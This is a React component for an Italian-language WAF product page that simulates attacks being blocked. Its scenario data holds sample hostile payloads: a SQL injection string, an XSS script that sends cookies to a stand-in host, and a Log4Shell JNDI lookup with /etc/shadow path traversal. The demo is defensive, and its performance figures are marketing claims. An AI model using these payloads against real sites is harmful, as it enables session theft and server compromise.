import React, { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Play,
  AlertTriangle,
  CheckCircle2,
  Cpu,
  Flame,
  Bug,
  KeyRound,
} from 'lucide-react';
import {
  evaluateThreat,
  AttackCategory,
  ThreatEvaluationResult,
  SecurityRulesConfig,
  DEFAULT_SECURITY_RULES,
} from '../utils/securityEngine';

interface AttackScenario {
  id: AttackCategory;
  name: string;
  icon: React.ComponentType<{ className?: string }>;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
  defaultPayload: string;
  httpMethod: string;
  targetPath: string;
  simulatedOriginCountry: string;
  simulatedRate: number;
  unprotectedConsequence: string;
}

const ATTACK_SCENARIOS: AttackScenario[] = [
  {
    id: 'sqli',
    name: 'SQL Injection (SQLi)',
    icon: Bug,
    severity: 'CRITICAL',
    description: 'Iniezione di clausole SQL malevole per bypassare l\'autenticazione ed estrarre il database clienti.',
    defaultPayload: "admin' OR '1'='1' -- UNION SELECT id, email, password_hash FROM users",
    httpMethod: 'POST',
    targetPath: '/api/v1/auth/login',
    simulatedOriginCountry: 'IT',
    simulatedRate: 15,
    unprotectedConsequence: 'Furto completo del database, esposizione hash password e violazione GDPR con sanzioni.',
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: AlertTriangle,
    severity: 'HIGH',
    description: 'Iniezione di codice JavaScript malevolo nei moduli o nei commenti per rubare cookie di sessione.',
    defaultPayload: "<script>fetch('https://evil-c2.net/steal?c='+document.cookie)</script>",
    httpMethod: 'POST',
    targetPath: '/comments/submit',
    simulatedOriginCountry: 'FR',
    simulatedRate: 8,
    unprotectedConsequence: 'Account takeover di amministratori e clienti, furto token JWT e sessioni bancarie.',
  },
  {
    id: 'ddos',
    name: 'Attacco DDoS HTTP Flood (Layer 7)',
    icon: Flame,
    severity: 'CRITICAL',
    description: 'Oltre 18.000 richieste al secondo generate da una botnet per saturare la CPU e mandare il sito offline.',
    defaultPayload: "GET /checkout/process?items=9999 HTTP/1.1 (Flood Burst 18.400 req/sec)",
    httpMethod: 'GET',
    targetPath: '/checkout/process',
    simulatedOriginCountry: 'DE',
    simulatedRate: 850,
    unprotectedConsequence: 'Saturazione memoria server, database locked, crash totale dell\'e-commerce e perdite economiche.',
  },
  {
    id: 'rce',
    name: 'Zero-Day & Remote Code Execution',
    icon: Cpu,
    severity: 'CRITICAL',
    description: 'Sfruttamento di falle nel framework (es. Log4Shell o Path Traversal) per eseguire comandi sul server.',
    defaultPayload: "${jndi:ldap://c2.threat-actor.org/exploit} /../../../../etc/shadow",
    httpMethod: 'GET',
    targetPath: '/actuator/gateway/routes',
    simulatedOriginCountry: 'NL',
    simulatedRate: 12,
    unprotectedConsequence: 'Compromissione totale dell\'host Linux, installazione di ransomware o cryptominer.',
  },
  {
    id: 'bruteforce',
    name: 'Credential Stuffing & Bot Brute-Force',
    icon: KeyRound,
    severity: 'HIGH',
    description: 'Botnet distribuita che testa milioni di coppie email/password sottratte da leak passati.',
    defaultPayload: "User-Agent: python-requests/2.28 (Automated Headless Scraper Cluster)",
    httpMethod: 'POST',
    targetPath: '/wp-login.php',
    simulatedOriginCountry: 'IT',
    simulatedRate: 420,
    unprotectedConsequence: 'Compromissione di centinaia di account utenti ignari e saturazione del server web.',
  },
];

export const ThreatSimulator: React.FC = () => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<AttackCategory>('sqli');
  const [customPayload, setCustomPayload] = useState('');
  const [activeRules, setActiveRules] = useState<SecurityRulesConfig>(DEFAULT_SECURITY_RULES);
  const [isRunning, setIsRunning] = useState(false);
  const [evaluationResult, setEvaluationResult] = useState<ThreatEvaluationResult | null>(null);
  const [simulatedLogs, setSimulatedLogs] = useState<string[]>([]);

  const currentScenario =
    ATTACK_SCENARIOS.find((s) => s.id === selectedScenarioId) || ATTACK_SCENARIOS[0];

  const payloadToTest = customPayload || currentScenario.defaultPayload;

  const runSimulation = () => {
    setIsRunning(true);
    setSimulatedLogs([
      `[T+0.0ms] Invio pacchetto simulato: ${currentScenario.httpMethod} ${currentScenario.targetPath}`,
      `[T+0.1ms] Rete Anycast AegisShield: pacchetto ricevuto dal nodo Edge Milano-01`,
      `[T+0.3ms] Avvio ispezione profonda: TLS Terminated, analisi protocollo HTTP/2`,
    ]);

    setTimeout(() => {
      const result = evaluateThreat(
        payloadToTest,
        currentScenario.id,
        activeRules,
        currentScenario.simulatedOriginCountry,
        currentScenario.simulatedRate
      );

      setEvaluationResult(result);
      setIsRunning(false);

      setSimulatedLogs((prev) => [
        ...prev,
        `[T+0.5ms] Ispezione OWASP CRS v4.0: ${result.ruleTriggered}`,
        result.isBlocked
          ? `[T+${result.mitigationTimeMs}ms] AZIONE PERIMETRALE: ${result.action} - Minaccia bloccata all'edge!`
          : `[T+${result.mitigationTimeMs}ms] ATTENZIONE: Traffico consentito verso l'infrastruttura di origine (${result.action})`,
        `[T+${result.mitigationTimeMs + 0.1}ms] Latency overhead: ${result.mitigationTimeMs} ms`,
      ]);
    }, 550);
  };

  const handleToggleRule = (ruleKey: keyof SecurityRulesConfig) => {
    setActiveRules((prev) => ({
      ...prev,
      [ruleKey]: !prev[ruleKey],
    }));
  };

  return (
    <section id="simulatore" className="py-20 bg-white/70 backdrop-blur-sm border-b border-slate-200/80">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Section Header */}
        <div className="max-w-3xl mb-12">
          <div className="flex items-center gap-2 text-xs font-semibold text-blue-700 tracking-wider uppercase mb-3">
            <span>Laboratorio di Verifica</span>
            <span aria-hidden="true" className="text-slate-300">·</span>
            <span className="text-slate-600">Simulatore Live WAF</span>
          </div>
          <h2 className="text-3xl sm:text-4xl font-extrabold text-slate-900 tracking-tight leading-tight">
            Simulatore di Attacchi Hacker in Tempo Reale.
          </h2>
          <p className="mt-3 text-base text-slate-600">
            Seleziona uno dei vettori d'attacco più comuni o inserisci un payload personalizzato. Guarda in che modo l'engine di mitigazione AegisShield analizza il pacchetto ed esegue il blocco istantaneo prima che tocchi il tuo server web.
          </p>
        </div>

        {/* Simulator Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          
          {/* Left Column: Attack Scenario Picker & Payload editor */}
          <div className="lg:col-span-5 space-y-6">
            
            {/* Scenario buttons */}
            <div>
              <p className="text-xs font-semibold uppercase tracking-wider text-slate-500 mb-3">
                1. Scegli il vettore d'attacco da testare:
              </p>
              <div className="space-y-2">
                {ATTACK_SCENARIOS.map((scenario) => {
                  const Icon = scenario.icon;
                  const isSelected = selectedScenarioId === scenario.id;
                  return (
                    <button
                      key={scenario.id}
                      type="button"
                      onClick={() => {
                        setSelectedScenarioId(scenario.id);
                        setCustomPayload('');
                        setEvaluationResult(null);
                        setSimulatedLogs([]);
                      }}
                      className={`w-full text-left p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 shadow-2xs ${
                        isSelected
                          ? 'bg-blue-50/50 border-blue-600/70 shadow-sm'
                          : 'bg-white border-slate-200 hover:border-slate-300 hover:bg-slate-50/60'
                      }`}
                    >
                      <div
                        className={`p-2 rounded-lg shrink-0 mt-0.5 ${
                          isSelected
                            ? 'bg-blue-600 text-white'
                            : 'bg-slate-100 text-slate-600'
                        }`}
                      >
                        <Icon className="w-4 h-4" />
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center justify-between gap-2">
                          <p className={`text-sm font-semibold truncate ${isSelected ? 'text-blue-950 font-bold' : 'text-slate-900'}`}>
                            {scenario.name}
                          </p>
                          <span
                            className={`text-[10px] font-mono px-2 py-0.5 rounded font-semibold ${
                              scenario.severity === 'CRITICAL'
                                ? 'bg-rose-50 text-rose-700 border border-rose-200'
                                : 'bg-amber-50 text-amber-700 border border-amber-200'
                            }`}
                          >
                            {scenario.severity}
                          </span>
                        </div>
                        <p className="text-xs text-slate-500 mt-1 line-clamp-2">
                          {scenario.description}
                        </p>
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Payload preview & edit */}
            <div className="p-4 rounded-xl bg-white border border-slate-200 shadow-xs space-y-3">
              <div className="flex items-center justify-between">
                <label htmlFor="payload-editor" className="text-xs font-semibold text-slate-700">
                  Payload pacchetto HTTP (Ispezionabile):
                </label>
                {customPayload && (
                  <button
                    onClick={() => setCustomPayload('')}
                    className="text-[11px] text-blue-600 hover:text-blue-800 underline cursor-pointer"
                  >
                    Ripristina predefinito
                  </button>
                )}
              </div>
              <textarea
                id="payload-editor"
                rows={3}
                value={payloadToTest}
                onChange={(e) => setCustomPayload(e.target.value)}
                className="w-full font-mono text-xs p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-900 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
              <div className="flex items-center justify-between text-xs text-slate-600 font-mono">
                <span>Target: <strong className="text-slate-900">{currentScenario.targetPath}</strong></span>
                <span>Metodo: <strong className="text-blue-700">{currentScenario.httpMethod}</strong></span>
              </div>
            </div>

            {/* Launch Button */}
            <button
              type="button"
              onClick={runSimulation}
              disabled={isRunning}
              className="w-full py-3.5 px-6 bg-slate-900 hover:bg-slate-800 active:scale-98 disabled:opacity-50 text-white font-bold text-sm rounded-xl transition-all shadow-sm flex items-center justify-center gap-2 cursor-pointer"
            >
              <Play className="w-4 h-4 fill-current" />
              <span>{isRunning ? 'Ispezione pacchetti in corso...' : 'Lancia Simulazione Attacco'}</span>
            </button>

            {/* Interactive toggle to test bypass */}
            <div className="p-3.5 rounded-xl bg-slate-50 border border-slate-200 text-xs">
              <p className="font-semibold text-slate-700 mb-2">Test di Bypassing (Simula disattivazione modulo WAF):</p>
              <div className="flex flex-wrap gap-2">
                <button
                  type="button"
                  onClick={() => handleToggleRule('sqlInjectionFilter')}
                  className={`px-2.5 py-1 rounded text-[11px] font-mono cursor-pointer transition-colors ${
                    activeRules.sqlInjectionFilter
                      ? 'bg-emerald-50 text-emerald-800 border border-emerald-300'
                      : 'bg-rose-50 text-rose-800 border border-rose-300'
                  }`}
                >
                  Filtro SQLi: {activeRules.sqlInjectionFilter ? 'ATTIVO' : 'SPENTO'}
                </button>
                <button
                  type="button"
                  onClick={() => handleToggleRule('xssFilter')}
                  className={`px-2.5 py-1 rounded text-[11px] font-mono cursor-pointer transition-colors ${
                    activeRules.xssFilter
                      ? 'bg-emerald-50 text-emerald-800 border border-emerald-300'
                      : 'bg-rose-50 text-rose-800 border border-rose-300'
                  }`}
                >
                  Filtro XSS: {activeRules.xssFilter ? 'ATTIVO' : 'SPENTO'}
                </button>
                <button
                  type="button"
                  onClick={() => handleToggleRule('virtualPatching')}
                  className={`px-2.5 py-1 rounded text-[11px] font-mono cursor-pointer transition-colors ${
                    activeRules.virtualPatching
                      ? 'bg-emerald-50 text-emerald-800 border border-emerald-300'
                      : 'bg-rose-50 text-rose-800 border border-rose-300'
                  }`}
                >
                  Virtual Patching: {activeRules.virtualPatching ? 'ATTIVO' : 'SPENTO'}
                </button>
              </div>
            </div>

          </div>

          {/* Right Column: WAF Inspection Console & Impact Comparison */}
          <div className="lg:col-span-7 space-y-6">
            
            {/* Visual 4-Stage Packet Pipeline */}
            <div className="p-4 rounded-xl bg-white border border-slate-200 shadow-2xs space-y-2.5 text-left">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <span className="font-bold text-slate-900 uppercase tracking-wider text-[11px]">
                  Flusso Ispezione Pacchetto in Tempo Reale
                </span>
                <span className="font-mono text-[10px] text-blue-700 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">
                  PIPELINE ATTIVA
                </span>
              </div>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
                <div className={`p-2.5 rounded-lg border transition-all ${
                  isRunning ? 'bg-amber-50 border-amber-300 text-amber-900' : 'bg-slate-50 border-slate-200 text-slate-700'
                }`}>
                  <span className="text-[10px] block font-mono text-slate-400">FASE 1</span>
                  <span className="font-bold block truncate">Origine Pacchetto</span>
                  <span className="text-[10px] font-mono text-slate-500">{currentScenario.simulatedOriginCountry} · IP Pubblico</span>
                </div>

                <div className={`p-2.5 rounded-lg border transition-all ${
                  isRunning ? 'bg-blue-50 border-blue-400 text-blue-900' : 'bg-slate-50 border-slate-200 text-slate-700'
                }`}>
                  <span className="text-[10px] block font-mono text-slate-400">FASE 2</span>
                  <span className="font-bold block truncate">Anycast L3/L4</span>
                  <span className="text-[10px] font-mono text-emerald-700 font-semibold">140 Tbps Shield</span>
                </div>

                <div className={`p-2.5 rounded-lg border transition-all ${
                  evaluationResult ? 'bg-blue-50 border-blue-400 text-blue-900' : 'bg-slate-50 border-slate-200 text-slate-700'
                }`}>
                  <span className="text-[10px] block font-mono text-slate-400">FASE 3</span>
                  <span className="font-bold block truncate">Engine WAF L7</span>
                  <span className="text-[10px] font-mono text-slate-500">OWASP CRS v4</span>
                </div>

                <div className={`p-2.5 rounded-lg border transition-all ${
                  evaluationResult?.isBlocked
                    ? 'bg-emerald-50 border-emerald-400 text-emerald-900'
                    : evaluationResult && !evaluationResult.isBlocked
                    ? 'bg-rose-50 border-rose-400 text-rose-900'
                    : 'bg-slate-50 border-slate-200 text-slate-700'
                }`}>
                  <span className="text-[10px] block font-mono text-slate-400">FASE 4</span>
                  <span className="font-bold block truncate">Esito Perimetrale</span>
                  <span className="text-[10px] font-mono font-bold">
                    {evaluationResult ? evaluationResult.action : 'In attesa'}
                  </span>
                </div>
              </div>
            </div>

            {/* Terminal Window with High-Contrast Dark Slate Body inside crisp container */}
            <div className="rounded-2xl border border-slate-800 bg-slate-950 overflow-hidden shadow-lg">
              {/* Terminal Titlebar */}
              <div className="flex items-center justify-between px-4 py-3 bg-slate-900 border-b border-slate-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="flex items-center gap-1.5">
                    <div className="w-2.5 h-2.5 rounded-full bg-rose-500/80" />
                    <div className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
                    <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
                  </div>
                  <span className="font-mono text-slate-300 ml-2">aegis-waf-inspector://edge-node-01</span>
                </div>
                <div className="flex items-center gap-2 text-slate-400 font-mono text-[11px]">
                  <span>OWASP Core RuleSet v4</span>
                  <span>·</span>
                  <span className="text-emerald-400">STATUS: READY</span>
                </div>
              </div>

              {/* Console Output Area */}
              <div className="p-4 sm:p-5 font-mono text-xs space-y-2.5 min-h-[220px] bg-slate-950 overflow-y-auto">
                {simulatedLogs.length === 0 ? (
                  <div className="h-40 flex flex-col items-center justify-center text-slate-500 text-center space-y-2">
                    <Terminal className="w-8 h-8 stroke-1 text-slate-600" />
                    <p>In attesa del comando di attacco simulato...</p>
                    <p className="text-[11px] text-slate-600">Clicca "Lancia Simulazione Attacco" per osservare l'ispezione WAF.</p>
                  </div>
                ) : (
                  simulatedLogs.map((log, idx) => (
                    <div
                      key={idx}
                      className={`${
                        log.includes('AZIONE PERIMETRALE') || log.includes('BLOCKED')
                          ? 'text-emerald-400 font-semibold'
                          : log.includes('ATTENZIONE') || log.includes('BYPASSED')
                          ? 'text-rose-400 font-semibold'
                          : 'text-slate-300'
                      }`}
                    >
                      {log}
                    </div>
                  ))
                )}
              </div>

              {/* Result Footer Card */}
              {evaluationResult && (
                <div
                  className={`p-4 border-t ${
                    evaluationResult.isBlocked
                      ? 'bg-emerald-950/30 border-emerald-900/50'
                      : 'bg-rose-950/30 border-rose-900/50'
                  }`}
                >
                  <div className="flex items-start gap-3">
                    {evaluationResult.isBlocked ? (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                    ) : (
                      <AlertTriangle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
                    )}
                    <div className="space-y-1 text-left">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-bold text-sm text-white">
                          {evaluationResult.isBlocked
                            ? 'Minaccia Neutralizzata con Successo'
                            : 'ATTENZIONE: Minaccia Consentita al Server'}
                        </span>
                        <span
                          className={`font-mono text-[11px] px-2 py-0.5 rounded font-semibold ${
                            evaluationResult.isBlocked
                              ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                              : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                          }`}
                        >
                          {evaluationResult.action}
                        </span>
                        <span className="text-slate-400 text-xs font-mono">
                          Latenza: {evaluationResult.mitigationTimeMs}ms
                        </span>
                      </div>
                      <p className="text-xs text-slate-300">
                        {evaluationResult.reason}
                      </p>
                      <p className="text-xs text-slate-400 italic">
                        {evaluationResult.recommendation}
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Impact Comparison (Without vs With AegisShield) */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-left">
              <div className="p-4 rounded-xl bg-rose-50 border border-rose-200/90 shadow-2xs">
                <div className="flex items-center gap-2 text-xs font-bold text-rose-800 uppercase tracking-wider mb-2">
                  <ShieldAlert className="w-4 h-4 text-rose-600" />
                  <span>Senza AegisShield</span>
                </div>
                <p className="text-xs text-slate-700 leading-relaxed">
                  {currentScenario.unprotectedConsequence}
                </p>
              </div>

              <div className="p-4 rounded-xl bg-blue-50 border border-blue-200/90 shadow-2xs">
                <div className="flex items-center gap-2 text-xs font-bold text-blue-900 uppercase tracking-wider mb-2">
                  <ShieldCheck className="w-4 h-4 text-blue-700" />
                  <span>Con AegisShield attivo</span>
                </div>
                <p className="text-xs text-slate-700 leading-relaxed">
                  Il pacchetto viene intercettato all'edge in 0.8ms. Il server di origine non subisce carichi CPU o accessi non autorizzati.
                </p>
              </div>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
};
